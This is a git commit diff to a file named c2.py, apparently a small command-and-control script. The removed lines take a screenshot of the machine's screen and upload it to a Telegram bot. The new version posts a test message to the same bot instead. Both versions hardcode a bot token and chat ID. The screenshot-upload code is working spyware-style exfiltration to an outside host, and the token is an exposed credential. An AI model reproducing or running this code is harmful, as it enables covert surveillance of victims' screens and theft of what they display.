cab79400d7392b71af95674aea335bb09bfad614
rb6sevent-cyber <rb6sevent@gmail.com>
2026-05-10 12:33:03 +0200

    Update c2.py

--- c2.py
+++ c2.py
@@ -1,20 +1,11 @@
-import io
 import requests
-import pyautogui
 
 BOT_TOKEN = "8704965597:AAHBfgSM0gDgTWLC24kgtAWGJ3ktGD3h0qs"
 CHAT_ID = "@re838102999xzjjiqlllxppcwihsaod9"
 
-img = pyautogui.screenshot()
-
-buffer = io.BytesIO()
-img.save(buffer, format="PNG")
-buffer.seek(0)
-
-url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
+url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
 
 requests.post(
     url,
-    data={"chat_id": CHAT_ID},
-    files={"photo": ("screenshot.png", buffer, "image/png")}
+    data={"chat_id": CHAT_ID, "text":"test"}
 )
